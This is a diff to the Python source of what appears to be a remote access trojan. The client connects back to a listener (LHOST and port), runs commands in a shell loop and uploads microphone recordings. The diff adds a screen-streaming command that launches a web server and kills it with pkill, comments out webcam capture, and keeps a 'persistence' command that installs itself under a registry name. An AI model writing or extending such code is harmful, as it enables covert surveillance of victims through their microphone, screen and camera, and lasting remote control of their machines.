@@ -8,13 +8,13 @@ import subprocess
 import sys
 import time
 import wave
-
+from subprocess import check_call
 import imageio as iio
 import pyaudio
 import pyautogui
 import termcolor
 
-LHOST = "192.168.234.130";PORT = 4444
+LHOST = "127.0.0.1";PORT = 4004
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -151,16 +151,18 @@ def shell():
             upload_file('recorded.wav')
             reliable_send('[+] Done recording')
             os.remove('recorded.wav')
-        # elif cmd == 'record_screen':
-        #     record_screen()
-        #     upload_file('output.avi')
+        elif cmd[:13] == 'screen_record':
+            if cmd[14:] == 'on':
+                subprocess.call("python web.py", shell=True)
+                reliable_send(termcolor.colored('[+] Go to http://yourip/:5000', 'green'))
+            if cmd[14:] == 'off':
+                check_call(["pkill", "-f", "web.py"])
+                reliable_send(termcolor.colored('[+] Done', 'green'))
+        # elif cmd == 'record_cam':
+        #     cam_record()
+        #     upload_file('cam_record.mp4')
         #     reliable_send('[+] Done recording')
-        #     os.remove('output.avi')
-        elif cmd == 'record_cam':
-            cam_record()
-            upload_file('cam_record.mp4')
-            reliable_send('[+] Done recording')
-            os.remove('cam-record.mp4')
+        #     os.remove('cam-record.mp4')
         elif cmd[:11] == 'persistence':
             reg_name, copy_name = cmd[12:].split(' ')
             persist(reg_name, copy_name)
